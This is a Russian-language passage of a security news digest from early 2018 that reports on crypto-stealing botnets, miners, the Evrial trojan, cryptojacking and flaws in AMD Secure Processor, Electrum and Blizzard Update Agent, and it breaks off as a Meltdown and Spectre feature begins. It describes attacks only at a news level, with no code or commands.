

                                       Мария «Mifrill» Нефёдова
                                                    nefedova@glc.ru





ПОГОНЯ ЗА
КРИПТОВАЛЮТОЙ
В декабре 2017 года стоимость Bitcoin достигла рекордных 20 тысяч дол‐
ларов, и интерес к криптовалютам в очередной раз воз рос, невзирая на то
что за прошедший месяц курс успел зна чительно снизиться. В результате
многие крупные биржи были вынуждены при остановить регистрацию новых
пользователей, не справляясь с наплывом жела ющих, а из магазинов вновь
почти полностью исчезли видеокарты, так как майнинг по‐прежнему может
быть весьма прибыльным занятием.
  Не оставляют криптовалюты без внимания и преступники. Так, за пос‐
ледние месяцы количество скрытой майнин говой малвари значительно уве‐
личилось, а также все агрессивнее становится так называемый «браузерный
майнинг» (он же криптоджекинг). Более того, теперь криптовалютой заин‐
тересовались опе раторы крупных ботнетов, и даже обыкновенные шиф‐
ровальщики уже распростра няются под видом кошельков для криптовалюты,
причем не существующей в реальности.


Satori
Специалисты Qihoo 360  Netlab обнаружили,  что 8 января 2018  года
на сетевом ландшафте появился новый ботнет — модификация уже извес‐
тного экспертам ботнета Satori. Исследователи уверены, что новую вари ацию
мал вари,   ранее   предназначавшейся   исклю чительно   для   взлома
IoT‐устройств, создал тот же самый автор, так как код вредоносов схож.
  Напомню,  что оригинальный  ботнет был замечен  в  начале  декаб‐
ря 2017 года. Вредонос Satori, на котором строился одноименный ботнет,
был очередной вариацией нашумевшего IoT‐вредоноса Mirai. Тогда аналити‐
ки Qihoo 360 Netlab предупрежда ли о 280 тысячах активных ботов, а также
о том, что угроза использует отличную от Mirai тактику. Дело в том, что клас‐
сическая версия Mirai работает как Telnet‐сканер, при этом используя длин‐
ные списки логинов и паролей, подходящих для раз личных «умных» устройств,
которые малварь брутфорсит. Но Satori имел на вооружении два эксплоита,
которыми пользовался вместо брутфорса.
   Теперь исследователи Qihoo 360 Netlab обнаружили модификацию Satori.‐
Coin.Robber,  которая,  как можно  понять  из  наз вания,  предназначена
для хищения криптовалюты. Если первый ботнет, как предполагают спе‐
циалисты, был создан начинающим хакером или скрипт‐кидди, то он опре‐
деленно учится. Новая версия малвари предназначена для атак не только
на IoT‐девайсы (вредонос по‐прежнему исполь зует те же экс плоиты), но и
на устройства для майнинга крип товалю ты Ethereum.
   Satori.Coin.Robber ска ниру ет порт 3333 и ищет майнинговое ПО Claymore
Miner, чтобы затем под менить адрес кошелька майнера своим. Пока иссле‐
дователи не опубликовали практичес ки никакой информации о самом экс‐
плоите, который применя ется малварью, так как опасаются ухудшить ситу‐
ацию. Известно лишь, что атакующий может без надлежащей аутентификации
взаимодействовать с устройством и подменять данные. Так, Satori.Coin.Rob‐
ber изменяет конфигурацию майнера, добавляя новый пул и новый кошелек.
В настоящее время, согласно статистике пула, оператор мал вари заработал
более 2 ETH (около 2000 долларов по текущему курсу).


Necurs
Операторы одного из крупнейших ботнетов в мире, Necurs, насчитывающе го
свыше шести миллионов зараженных хостов, тоже заинтересовались крип‐
товалютой, а точнее, исполь зуют ботнет для манипуляций курсами.
   Стоит сказать, что это не первый опыт такого рода для владельцев бот‐
нета. Ранее операторы Necurs уже пытались манипу лировать рынком ценных
бумаг. Тогда послания спа меров строились на классической в этой области
схеме  «накачки и сброса» (pump‐and‐dump). Эта незаконная практика
используется для искусственного повышения цен на акции: пользователей
вводят в заблуждение, чтобы продать дешевые акции по более высокой цене.
Ранее злоумышленники мас сово дезин форми ровали пользовате лей, сооб‐
щая, что, по данным некой манхэттенской фирмы, в скором времени ком‐
пания InCapta Inc ($INCT), которая занимается разработкой мобильных при‐
ложений, будет приобретена по цене 1,37 доллара за акцию компанией DJI,
производящей дронов. Зло умышленни ки рекомендовали скупать акции In‐
Capta Inc, пока не поздно, и обещали, что эти вложения принесут большую
прибыль.
  Сейчас опе раторы ботнета используют ту же тактику, вновь реализуя схе‐
му pump‐and‐dump, только на этот раз для «продвижения» криптовалюты
Swisscoin (SIC). Причем данный альткоин еще в прошлом году был назван
сетевым маркетингом от криптовалюты, реализующим так называемую схему
Понци, после чего его обра щение было приостановлено. Однако торговля
возобновилась 15 января 2018 года, чем и пос пешили воспользоваться зло‐
умышленники.
   Рассылаемый Necurs спам обещает, что сто имость Swisscoin может уве‐
личиться на 50 тысяч процентов в текущем году, а вложение тысячи дол ларов
в итоге принесет инвестору миллион.





                   Динамика цен на Swisscoin

К сожалению, трудно судить, как именно дей ствия операторов Necurs влияют
на стоимость Swisscoin: в янва ре 2018 года весь криптовалютный рынок ощу‐
тимо «просел», цена Bitcoin опус калась ниже 9000 долларов, и стоимость
альткоинов тоже менялась практичес ки непредсказуемо (преимущес твенно
в сторону резкого понижения).

Атаки на веб‑серверы
Однако ботнеты — далеко не единственная «криптовалютная» проблема
на сегодняшний день. Уже давно ста ло ясно, что преступники осознали, нас‐
колько выгодным может быть заражение майнинговой мал варью различных
серверов, на которых вредоно са обна руживают далеко не сразу, а мощность
их,  как правило, существенно превосходит обычные  пользовательские
устройства.
  Очередным  тому  доказа тельством  ста ло  обнаружение  вре доноса
RubyMiner, о котором предупредили специалисты Check Point и Certego.
По данным иссле дователей, малварь массово ата кует уяз вимые веб‐серверы
в Великобритании, Германии, США, Норвегии и Швеции и успе ла заразить
более 700 машин за первые сутки.





                         Активность RubyMiner

Под угрозой оказались уязвимые перед раз личными багами серверы на базе
Windows и Linux. Эксплуатируя уязвимости, обнаруженные в PHP, Microsoft IIS
и Ruby on Rails еще в 2012–2013 годах, прес тупники устанавливают на сер‐
веры майнер XMRig для «добычи» криптовалю ты Monero. По данным спе‐
циалистов, преступники не особенно ста раются скрыть свои действия, ско‐
рее, атака направлена на компрометацию как мож но большего количес тва
устройств за минимальное время.


Мошен ничество и мал варь
Продолжают процветать более тра дици онные угрозы, например трояны. Так,
специалисты MalwareHunterTeam и Guido Not CISSP обнаружили, что на чер‐
ном рынке активно рекламируется и продается но вый троян Evrial. Как и
любой другой инфостилер, Evrial похища ет с зараженных машин файлы cookie
и учетные данные. Однако авторы также «научили» свое детище внимательно
следить за содержимым буфера обмена Windows.
    Evrial не похищает из буфера обмена все подряд. Вместо этого троян
дожидается,  когда  в буфер попадет адрес криптовалютного кошелька
или URL предложения обмена Steam. Как только это происходит, малварь
подменяет адрес кошелька или URL на адрес или ссылку, принадлежащие
злоумышленникам.





                       Промосайт Evrial

Кроме того, Evrial похищает данные о криптовалютных кошельках (файлы wal‐
let.dat), сохраненные на устройстве пароли  (в частнос ти, из браузеров
Chrome, Yandex, Orbitum, Opera, Amigo, Torch и Comodo, а также пароли, хра‐
нящиеся в Pidgin и Filezilla), документацию и делает снимки активных окон
жертвы. Вся эта информа ция упа ковывается в архив (ZIP) и загружается
на управляющий сервер.
  В настоящее время исследователи не определили, как именно рас‐
пространяется Evrial, но, по данным MalwareHunterTeam, троян продается
на русскоязычных андеграундных ресурсах по цене 1500 рублей. За эту сумму
покупатель получает дос туп к веб‐панели, где может сконфигурировать мал‐
варь нужным ему образом: выб рать адреса и ссылки для замены, а также
отслеживать подмены, уже сделанные вредоносом.
   Стоит отметить, что подмена адресов криптовалютных кошельков в целом
становится весьма рас простра ненным явлением. Специалисты компании
Proofpoint обнаружили, что операто ры некоторых Tor2Web‐прокси и gate‐
way’ев наживаются на пользователях, которые уже стали жертвами вымога‐
тельского ПО, а также на авторах этого самого вымогательского ПО.





                    Пример подмены адреса

К примеру, операторы сервиса Onion.top занимаются скры тым парсингом
сайтов, которые посетители открывают при помощи их ресурса. Так, если
пользователи обращают ся к официальным страницам вымогателей LockeR,
Sigma и GlobeImposter, операторы Onion.top подменяют адреса  Bitcoin‐
кошельков для оплаты выкупов на свои.


Криптодже кинг
Одна из самых неприятных раз новидностей скрытого майнинга — браузер‐
ный майнинг, когда устройства прос тых посетителей сайтов используются
для добычи криптовалюты (разумеется, без ведома самих пользовате лей).
  Ранее скрытые майнеры уже находили в тысячах интернет‐магазинов и в
приложениях для Android. Добыва ющие криптовалю ту скрипты скрываются
во вредоносной рекламе, пря чут ся от блокировщиков при помощи дис петче‐
ра тегов Google, исполь зуют виджеты популярного сервиса LiveHelpNow,
интегрированные в код множес тва сайтов, а популярные CMS и вовсе захлес‐
тнула волна атак, целью которых явля ется именно установка майнинговых
скриптов.
   Так, еще в декабре 2017 года ана литики компании Sucuri пре дупреждали
о вредоносной кампании, развернутой против плохо защищенных и давно
не обновляв шихся сайтов на базе WordPress. Напомню, что тогда специалис‐
ты обнаружили, что зло умышленники загружают на взломанные сайты скрип‐
ты, работающие как кейлоггер и ворующие все данные, которые пользовате‐
ли заносят в различные формы. Также скрипты подгру жали на зараженные
сайты криптовалютный майнер  Coinhive. Предполагалось, что кампания
активна как минимум с апреля 2017 года и от рук злоумышленни ков постра‐
дали более 5500 сайтов.
   Теперь спе циалисты Sucuri представили но вый отчет, согласно которому
злоумышленники по‐прежнему не прекратили свою операцию. Преступники
все так же компрометируют сайты через уязвимые темы или плагины и экс‐
плуатируют баги в старых вер сиях WordPress. На фронтенде взломщики раз‐
мещают браузерный майнер Coinhive, исполь зующий компьюте ры посети‐
телей таких сайтов для «добычи» криптовалюты Monero.
   Согласно данным PublicWWW, скрипты с этих доменов загружаются более
чем для 2000 сайтов. Одна ко далеко не все сайты индекси руются PublicWWW,
так что иссле дователи полагают, что на самом деле пострадавших ресурсов
гораздо больше.
   Также в январе 2018 года майнинговые скрипты проекта Coinhive доб‐
рались даже до YouTube, куда криптоджекинг про ник через рекламную плат‐
форму Google DoubleClick.
  По данным специалистов Trend Micro, вредоносная кампания с исполь‐
зованием Google DoubleClick и скриптов JavaScript, внедренных в рекламные
объявления, стартовала еще 18 января 2018 года и резко набрала обо‐
роты 23 января. Сообщается, что большинс тво пострадавших находились
в Японии, Франции, Италии, Испа нии и на Тайване.





                   Схема январской ата ки Coinhive

Эксперты пишут, что атакующие использовали два майнинговых скрипта.
Первая разновидность представляла собой обычный вариант  Coinhive,
который проект предлагает всем своим клиентам. Но вторая разновидность,
использовав шаяся примерно в 10% случаев, была кастомной разработкой
самих злоумыш ленников. Она поз воляла не отда вать 30% криптовалютной
прибыли операто рам Coinhive. Оба скрипта поглощали приблизительно 80%
ресурса пользовательских CPU и добыва ли криптовалюту Monero.


123456 — ВСЕ ЕЩЕ САМЫЙ ПОПУЛЯРНЫЙ ПАРОЛЬ

Много лет подряд аналитики компании SplashData сос тавляют список «100 самых худших
паролей  года». Так специалисты пытаются привлечь внимание  к проблеме ненадежных
паролей, но общая картина со временем меняется мало. Равно как и год назад, самым худшим
паролем 2017 года был приз нан 123456.

Также среди часто используемых паролей по‐прежнему популярен спорт (football, baseball,
soccer, hockey, Lakers, jordan23,  golfer, Rangers, Yankees), марки автомобилей (Mercedes,
Corvette, Ferrari, Harley) и простейшие словосочетания, которые можно попросту подобрать
вручную, без всякого брутфорса (iloveyou, letmein, whatever, blahblah).





БАГ В AMD SECURE
PROCESSOR
Компания AMD подготовила исправления для своих прошивок BIOS/UEFI.
Дело в том, что в компоненте, который ранее был известен как «процессор
для обеспечения безопас ности платформы» (Platform Security Processor),
а теперь называется прос то Secure Processor, была обнаружена серьезная
уязвимость.
   Secure Processor представляет собой механизм безопасности, во многом
похожий на Intel Management Engine. Это тоже сис тема chip‐on‐chip, которая,
как гласит официальный сайт компании, «исполняет роль защитного „слоя“
на оборудовании, создавая безопасную среду за счет разделения централь‐
ного процессора на два виртуальных „мира“. Важ ные задачи выполняются
в „безопасном мире“ AMD Secure Processor, а дру гие задачи — в обычном
режиме».
   RCE‐уязвимость в AMD Secure Processor, а именно в Trusted Platform Mod‐
ule (TPM), обнаружили специалисты Google Cloud Security Team. Именно TPM
хранит такие критические системные данные, как пароли, сертификаты и клю‐
чи шифрования.
  Иссле дователи провели вручную ста тичес кий анализ и выявили проблему
переполнения сте ка, связанную с функцией EkCheckCurrentCert. Через эту
брешь, используя специально созданные EK‐сертификаты, атакующий может
добиться получения прав на выполнение произвольного кода в Secure Pro‐
cessor, ском прометировав таким обра зом всю систему. Причем эксплуата‐
цию уязвимости иссле дователи называют весь ма тривиальной, так как Secure
Processor не использует такие средства защиты, как ASLR, No‐eXecute
или stack cookies. Единс твенная хорошая новость заключается в том, что
предварительно атакующему все же понадобится дос туп к уяз вимой машине,
скорее всего физический.
  Инженеров AMD поставили в извес тность о проблеме еще в сен‐
тябре 2017 года, а в декаб ре разработчики сооб щили, что создали исправ‐
ление и готовятся к его рас пространению. Судя по все му, именно поэтому
некоторые владельцы процессоров недавно обнаружили появление новой
опции — отключения поддержки AMD PSP.





→«Эти [патчи] дела ют безумные вещи. Они делают бес смысленные вещи. Из‐за них ваши
аргументы выглядят подоз рительно и вызывают воп росы. Эти патчи творят вещи за гранью
здравого смысла. Какого х** вообще происходит? Все это пол нейший мусор. Intel правда пла‐
нирует сделать это дерьмо архитектурным? Кто‐нибудь пытался поговорить с ними и объ‐
яснить, что они спятили на ***? Пожалуйста, если здесь есть инженеры Intel, поговорите
со своими менеджерами»,
— Линус Торвальдс о патчах для уязвимости Spectre, созданных инженерами компании Intel





                                     Продолжение статьи →
← Начало статьи





 WI‐FI СТАНЕТ
 БЕЗОПАСНЕЕ
  Осенью 2017 года обнаружение целого комплекса уяз вимостей, получивших
  общее  название  KRACK,  пос лужило  четким  сигналом  для  индустрии:
  WPA2 больше нельзя считать безопас ным. Осознавая серьезность проб‐
  лемы, угрожающей миллионам устройств, предста вители организации WiFi
   Alliance рассказали о скором появлении WPA3 и опубликовали первые детали
   грядущих изменений.
    Подробные  спецификации  WPA3   будут  обнародованы   позднее
   в 2018 году, но о четырех важ ных осо бенностях стало извес тно уже сейчас.
  Новая версия стандарта призвана сделать Wi‐Fi‐сети более безопас ными.
    В частности, в WPA3 обещают реализовать встроенную защиту от брут‐
   форс‐атак, которая будет блокиро вать аутентифика цию после ряда неудач‐
  ных попыток. Также у пользователей появится воз можность использовать
  одни Wi‐Fi‐устройства для конфигурирова ния других. К при меру, можно будет
  использовать смартфон или планшет для нас трой ки WPA3 на «соседству‐
  ющем» устройстве без экрана — таких немало среди IoT‐гад жетов (умные
  замки, лампочки и так далее).
    Еще две анонсированные функции напрямую связаны с шифрованием.
   Так, WPA3 предложит устройствам «индивидуализированное шифрование
  данных»,  то  есть шифровать любые  соеди нения,  как между самими
  устройствами, так и связывающие их с роутером или точкой дос тупа. Кроме
   того, появится новый, улучшенный криптографичес кий стандарт, который
  представители WiFi Alliance описывают как «192‐раз рядный пакет безопас‐
   ности». Он будет ориентировать ся на Commercial National Security Algorithm
  (CNSA) Suite, созданный Комитетом по системам национальной безопас‐
  ности (Committee on National Security Systems). Данное решение пред назна‐
   чается в первую оче редь для сетей, где требует ся повышенная безопас ность,
   то есть для госучреждений, оборонных и индус триальных предприятий.
     Разработка WPA3 уже ведется, и WiFi Alliance не теряет времени даром.
  Ожидается, что первые устройства с поддержкой нового стандарта появятся
   в продаже до конца 2018 года.


  БАНК РОССИИ РАС СКАЗАЛ О БОРЬБЕ С МОШЕННИКАМИ

   Представители ЦБ сообщили, что в 2017 году им удалось обнаружить око ло 1000 вредонос ных
   сайтов и почти 90% таких доменов было разделегировано. Вмес те с этим Банк Рос сии приз‐
   нает, что практически бессилен против легаль ных сайтов с низким уровнем безопасности,
   взломанных злоумышленниками и годами рас пространяющих вредонос ное ПО.

  В 2017 году Банк России разделегировал 840 доменов, из которых 740 были фишинговыми,
   а еще 100 распространяли вредоносное прог раммное обес печение.





   1/3 всех кибератак нацелена именно на частных лиц, а не на ком пании. В основном атакующие
   используют социальную инженерию (37%), прибегают к компрометации учетных данных (26%),
   а также практикуют заражение вре донос ным ПО (16%).

  В 62% случаев первым этапом атак оказывается рассылка писем с фишинговыми ссыл ками
   или вредоносными вложениями.





 ПРИВАТНЫЕ
 РАЗГОВОРЫ
  Компания Microsoft сообщила о начале сотрудничества с разработчиками
  Open Whisper Systems (создатели Signal) и появлении в Skype функции end‐
   to‐end шифрования.
    Новая функция получила наз вание Private Conversations («Приватные раз‐
   говоры») и уже появилась в тестовых сборках Skype Insider. При помощи Pri‐
   vate Conversations можно шифровать аудиозвонки и текстовые сообщения.
  Аудио‐ и видеофайлы, а  также изображения, переданные через такой
  защищенный чат, также будут зашифрованы.
     Для реализации end‐to‐end шифрования Microsoft использует откры тый
  протокол Signal (ранее известный как TextSecure Protocol). Этот же протокол
  уже используют WhatsApp, Facebook Messenger, а также при ложе ние Allo, раз‐
  работанное Google.
    При желании опробовать Private Conversations в деле можно уже сей час,
  для  этого  понадобится  ска чать  и  уста новить  Skype   Insider  вер‐
  сии 8.13.76.8 для Android, iOS, Linux, Mac или Windows. Разумеется, чтобы
   end‐to‐end шифрование заработало, использовать Skype Insider должны обе
   стороны. Также стоит отметить, что end‐to‐end шифрование для виде‐
  озвонков и групповых чатов пока не реализова но.


  10% УЧТЕННЫХ ЗАПИСЕЙ GOOGLE ЗАЩИЩЕНЫ ДВУХ‐
  ФАКТОРНОЙ АУТЕНТИФИКАЦИЕЙ

  В док ладе на конференции Usenix Enigma 2018 специалист компании Google Гжегож Милка
   (Grzegorz Milka) рассказал, что с двухфактор ной аутентификацией дела обстоят весьма печаль‐
   но. По данным исследователя, в настоящее время менее 10% активных аккаунтов Google
   защищены двух фактор ной аутен тификацией.

   Более того, согласно исследованию Pew Research Center, лишь 12% аме риканских пользовате‐
   лей применяют для защиты своих учетных записей хотя бы пароль ный менеджер.





 ТЕЛЕМЕТРИЯ
 WINDOWS 10
  В последние годы ком пания Microsoft не раз стал кивалась с тре бованиями
  властей и регулирующих органов раз ных стран — всех очень волнует вопрос
  сбора информации о пользователях. Так, ранее французские власти при‐
  казывали Microsoft перестать следить за пользователями Windows 10, Евро‐
  союз выражал обеспокоенность по этому же поводу, а Фонд электронных
  рубежей и вовсе жестко рас критиковал полити ку компании.
    В ответ на массовое недовольство Microsoft пытается стать прозрачнее.
  К примеру, в прошлом году компания уже детально объяснила, какую именно
  телеметрию собирает ОС. Затем пользователям предоставили возможность
   регулировать настрой ки приватности, упростив их и сде лав понятнее: появи‐
  лись уровни сбора данных Full и Basic, и компания подробно рассказала
  о каждом из них.
     Теперь представители Microsoft сообщили, что вместе со сле дующим
   крупным обновлением для Windows 10, выход которо го запланирован на вес‐
   ну 2018 года, появится специальный инс трумент, поз воляющий следить
  за сбором данных еще более детально. Приложение получило название Win‐
  dows Diagnostic Data Viewer, и оно уже доступно в Windows Store для поль‐
  зователей Windows Insiders.
     Как можно понять из наз вания, Windows Diagnostic Data Viewer позволит
  лишь просматривать информа цию о сборе телеметрии, но не даст поль‐
  зователям управлять ею или что‐либо уда лять. Сооб щается, что приложение
  должно стать вспомогательным инструментом, который поможет определить,
   какие данные собирает система и какие методы могут использоваться
  для отключения такой «слежки» в каждом конкрет ном случае.
    Приложение позволит пользователям и администраторам прос матривать
  детальную информацию о том, какую именно телеметрию собирает операци‐
  онная система. К каким именно данным пользователи получат доступ, хорошо
  видно на приведенных ниже скриншотах.





                Фильтр по типу собира емой информации





                     Пример собираемых данных


  300 000 000 ДОЛЛАРОВ ПОТЕРЯЛИ ICO ИЗ‐ЗА ДЕЙСТВИЙ
 ЗЛОУМЫШЛЕННИКОВ

   «Лаборатория Каспер ского» опубликовала интересую статистику. По подсчетам специалис тов,
   в 2017 году в ходе ICO (Initial Coin Offering, первичное размещение токенов) суммарно было
   привлечено 3,5 миллиарда долларов, из которых 300 миллионов долларов в ито ге были
   похищены злоумышленниками. Исследователи под считали, что от дей ствий преступников пос‐
   традали более 60 000 человек.

   За весь 2017 год эксперты «Лаборатории Касперско го» зарегис трировали более 2000 хакер-
   ских атак на проводящиеся ICO. Инте рес злоумышленников к этой области совсем неуди‐
   вителен: средний инвестор готов вложить в ICO поряд ка 5000 дол ларов.





 УЯЗВИМОСТЬ
 КОШЕЛЬКА
 ELECTRUM
  Еще в ноябре 2017 года пользователь GitHub, известный как jsmad, обратил
  внимание разработчиков криптовалютного кошелька Electrum на обнаружен‐
  ную в коде проблему.
     Как выяснилось, баг позволял любому сайту и людям, которые его контро‐
  лируют, похищать средс тва пользователя, если  Electrum был запущен
  одновременно с браузером и не защищен паролем. Если пароль все же был
   установлен, это дол жно было защитить пользователя, пока тот не осущест‐
  влял   транзакций.   Уяз вимость   присутс твовала   в   коде   Electrum
  с начала 2016 года, с версии 2.6. Проб лема связана с интерфейсом JSON‐
  RPC, реализация которого в Electrum ока залась небезопас ной.
     К сожалению, осознать всю серьезность проблемы в пол ной мере раз‐
  работчики Electrum сумели только пос ле дополнительного пре дупреждения,
  полученного от специалис та Google Project Zero Тевиса Орманди (Tavis Or‐
   mandy). Недавно эксперт обнаружил ту же самую уязвимость, узнал, что о ней
  уже сообщали ранее, и обра тил внимание разработ чиков, что баг в высшей
   степени опасный.





  В результате 7 января 2018 года для Electrum был выпущен экс тренный патч,
  и уже на сле дующий день появилась новая версия кошелька (3.0.5), в которой
   уязвимость была устранена окончательно. Так как кошельки не предусматри‐
  вают автоматического обновления, теперь безопасность пользователей в их
  собственных руках и зависит от  того, нас коль ко часто они проверяют
  обновления ПО.


  КРИПТОВАЛЮТА LITECOIN НАБИРАЕТ ПОПУЛЯРНОСТЬ
  НА ЧЕРНОМ РЫНКЕ

   Эксперты компании Recorded Future изучили положение дел на черном рынке. Спе циалисты
   погрузились в даркнет и проанализировали содержимое более 150 форумов, торговых пло‐
   щадок и сайтов, предлага ющих незаконные услуги. Иссле дователи хотели понять, какие крип‐
   товалюты наиболее распространены в киберкриминальной среде на данный момент и чему
   отдают предпочтение преступники.


   Наибольший интерес киберпреступники проявляют к крип товалюте Litecoin: платежи в этой
   валюте принимают 30% изученных сайтов, сервисов и продавцов. Второе мес то дос талось
   криптовалюте DASH, ее используют 20% рас смотренных экспертами ресурсов. Замыкают спи‐
   сок Bitcoin Cash, Ethereum и Monero (13, 9 и 6% соответс твенно).





  В англоязычном сегменте даркнета наибольшей популярностью пользуется Monero. В рус ско‐
   язычной среде предпочитают Litecoin.
   На одном из исследуемых форумов эксперты обнаружили любопытный опрос: пользователям
   предложили проголосовать  за «любимую» криптовалюту, которую  те  хотели бы  видеть
   в будущем в качестве способа рас четов на большинстве сайтов. Лидерами в этом опро се ока‐
   зались Monero и DASH, тогда как Litecoin занял лишь четвертое место.





 ОГРАБЛЕНИЕ БИРЖИ
 COINCHECK
  26 января 2018 года крупная японская криптовалютная биржа Coincheck
  сообщила об ограблении, которое может стать самым крупным инцидентом
   такого рода в истории. Зло умышленники похитили у компании криптовалюту
  NEM (XEM) на сумму, превышающую полмиллиарда дол ларов.
     Команда проекта сооб щила о хищении при мерно 500 мил лионов монет
  NEM, что по курсу на момент ата ки сос тавляло порядка 523 миллионов дол‐
  ларов США. В результате кражи постра дали около 260 тысяч пользователей.
  Биржа была вынуждена приостановить практичес ки все операции с крип‐
  товалютами, банковскими картами и платеж ным сервисом Pay Easy до выяс‐
  нения всех обстоятельств про исшедшего.
    На срочной пресс‐конференции руководс тво Coincheck под твердило, что
  неизвестные злоумышленники похитили только криптовалюту NEM. При этом
  представители бир жи сообщили, что Coincheck не использовала смарт‐кон‐
   тракты с мультиподписью, одна ко компания оказалась не готова приз нать,
   что имела какие‐либо проб лемы с безопасностью.
     Глава NEM Foundation Лон Вонг (Lon Wong) тоже поспешил прокомменти‐
  ровать случившееся и заявил, что с безопасностью NEM все в пол ном поряд‐
   ке, а вина за инцидент полностью лежит на Coincheck. По мне нию Вонга,
  если бы биржа не пренебрегала контрактами с мультиподписью, ничего
  подобного бы не произошло.
    Попытки Вон га прояснить ситуацию вполне понятны. Дело в том, что крип‐
  товалюта NEM заметно потеряла в цене сразу пос ле сообщения об инциден‐
   те (см. график ниже).





                       Динамика цен NEM

  Спустя несколько дней предста вители Coincheck заверили, что всем постра‐
  давшим будет выплачена компенсация. В общей сумме операторы Coincheck
  покроют  более  400  миллионов  долларов  убытков,  исходя  из  рас‐
   чета 88,549 иены (примерно 0,81 доллара) за каж дую похищенную монету
  NEM. Точные даты выплаты компенсаций пока не были наз ваны.
     Разработчики NEM Foundation, в свою очередь, уверяют, что оказывают
  всю возможную помощь постра давшей бир же и пра воохранительным орга‐
   нам, которые уже занимаются расследованием случившегося. Специалисты
  сообщили, что планируют пристально отслеживать все украденные у Co‐
   incheck средства, чтобы не дать зло умышленникам скрыться с награбленным
   в неизвестном направлении.


 ОБНАРУЖЕНО БОЛЕЕ 130 ВРЕДОНОСНЫХ ОБРАЗОВ
  КОДА, ЭКСПЛУ АТИ РУЮЩИХ MELTDOWN И SPECTRE

   Эксперты компаний AV‐TEST пре дупредили, что прес тупники уже разрабатывают малварь, экс‐
   плуатирующую глобальные уязвимости Meltdown и Spectre. Аналитики обнаружили 139 вре‐
   доносных образов, связанных с использованием «процес сорных» багов. Эти концепты ориенти‐
   рованы на разные платформы (Windows, Linux и macOS), а также среди них были замече ны
   JavaScript PoC‐эксплоиты для браузеров, включая IE, Chrome и Firefox.


   Пока все факты указывают на то, что большинс тво срабатываний про исхо дит из‐за действий
   самих ИБ‐специалистов, которые продол жают изучать проблему. Однако эксперты опасаются,
   что разработчики малвари тоже трудятся не покладая рук, и опре делен ный про цент обнаружен‐
   ных PoC уже может принадлежать «перу» киберпрес тупников.





 АГЕНТ BLIZZARD ПОД
 УГРОЗОЙ
  Сотрудник Google Project Zero Тевис Орманди обнаружил опасную уяз‐
  вимость в составе Blizzard Update Agent, из‐за которой миллионы поклонни‐
   ков игр компании Blizzard Entertainment (World of Warcraft, Overwatch, Diablo III,
   Hearthstone, Starcraft II) могли стать жертва ми злоумышленников.
     Для корректной работы игр компании Blizzard Entertainment требуется
   установить специальный «агент обновлений» (Blizzard Update Agent), который
   запускает на компьютере игрока сервер JSON‐RPC, работающий с HTTP
  и портом 1120. Он принимает команды на уста новку, удаление и изменение
  настроек и обновле ние свя занных с ним про дуктов.
    Орманди обнаружил, что Blizzard Update Agent уяз вим перед атаками типа
  DNS Rebinding, то есть злоумышленники могут выдать любой сайт за «мост»
  между сервером Blizzard и клиентом жертвы. Таким образом преступники
  получают возможность отпра вить Blizzard Update Agent произвольный файл
  под видом игрового обновления.
    Проблема была найдена еще в начале декабря 2017 года, а 22 декаб‐
  ря 2017 года разработчики Blizzard Entertainment закрыли уязвимость. Однако
  Орманди считает, что инженеры компании не стали прис лушиваться к его
  советам и фак тически прервали общение пос ле устранения бага (даже
  не сообщив, что устранили его). Исследователь недоволен тем, как именно
   сотрудники Blizzard Entertainment решили данную проблему.
      Так, патч для Blizzard Update Agent (версия 5996) использует слишком
  сложный метод устранения бага: теперь Blizzard Update Agent берет имя при‐
  ложения, отправляющего команды серверу JSON‐RPC, вычис ляет 32‐битный
  хеш FNV‐1a, а затем сравнивает со списком приложе ний, которым не раз‐
  решено обращаться к JSON‐RPC. Браузер, судя по всему, находится в чер‐
  ном списке.



        «Я пред лагал использовать „белый список“ для имен хос тов, но, оче-
        вид но, это решение было слиш ком эле гантным и прос тым, — пишет
        Орманди. — Я недоволен тем, что Blizzard выпус тила патч, не уве-
        домив меня и не посове товав шись по этому воп росу. Оче вид ная
        недора ботка в этой схе ме зак люча ется в том, что чер ный список
        необходимо под держивать и дополнять, так что я ожидаю, что со вре-
        менем он отка жет или проблемы воз никнут у пользовате лей необыч-
        ных бра узе ров».

  Представители Blizzard Update Agent отреаги рова ли на раскрытие информа‐
  ции об уязвимости и критику Орманди, сооб щив, что занимаются разработ‐
  кой более эффективного патча.





  →«Мы были ошеломлены тем, как быстро наше решение нашло широкий отклик. Оглядываясь
   назад, могу сказать, что мы были весьма наивны, ког да строили теории о том, как будет
   использоваться наш майнер. Мы считали, что большинство сайтов будут использовать Coinhive
   открыто, позволяя пользователям решать, запускать ли его ради каких‐то бонусов, как пос‐
   тупили мы сами во время тестирования на pr0gramm.com перед запус ком. Но в первые же дни
   после появления Coinhive все пошло совершенно не так. Теперь дос таточно обратиться к поис‐
   ку Google, и вы найдете множество инструкций для „удаления вируса Coinhive“. Все про изво‐
   дители антивирусов уже занесли нас в черные спис ки. Не думаю, что наша репутация могла бы
   стать намного хуже, чем сейчас»
  — один из разработчиков сервиса Coinhive, пожелавший сохранить инкогнито, о майнинге
   через браузеры и злоумышленниках, испортивших репутацию проекта
COVERSTORY





                    Андрей Васильков
                        angstroem@hotbox.ru




MELTDOWN
И SPECTRE

РАЗБИРАЕМ ФУНДАМЕНТАЛЬНЫЕ
УЯЗВИМОСТИ В ПРОЦЕССОРАХ



Самый  большой  подарок  всем  хакерам  преподнесли
в новогодние праздники эксперты по безопасности. Они
нашли фундаментальные недостатки в архи тектуре сов‐
ременных процес соров. Используя эти уязвимости, легко
нарушить изоляцию адресного пространства, прочитать
пароли, ключи шифрования, номера банковских карт, про‐
извольные данные системных и других пользовательских
приложений в обход любых средств защиты и на любой ОС.


КОРЕНЬ ПРОБЛЕМЫ
Изначально в блоге Google Project Zero со обща лось об успешной реализации
трех вариантов атаки на кеш процес сора:
 • злонаме ренная загрузка данных в кеш;
 • обход границ массива;
 • инъекция целевой вет ви.

Формально их описали как две сходные уяз вимости — Meltdown (первый
вариант атаки) и Spectre (второй и третий варианты). Сценарии их практичес‐
кого использования зависят от микроархитектуры ЦП и операционной сис‐
темы, в разной степени затрагивая производителей железа, облачных про‐
вайдеров и сообщество Linux.
   Авторы исследования зна ли о проб леме давно. 1 июня 2017 года они
отправили свои отче ты в Intel, AMD и ARM, пообещав не публиковать детали
до тех пор, пока разработчики не выпустят патчи. Однако произошла утечка
информации, из‐за которой им пришлось обнародовать под робности рань‐
ше.
   Уязвимости имеют мно го сходных черт на концепту альном уровне. Обе
делают возможным про веде ние атаки по сто рон нему каналу, исполь‐
зуя недостатки физической реализации про цес соров. Впервые данный класс
атак подробно описал Пол Кёхер (Paul Köcher) еще в 1996 году применитель‐
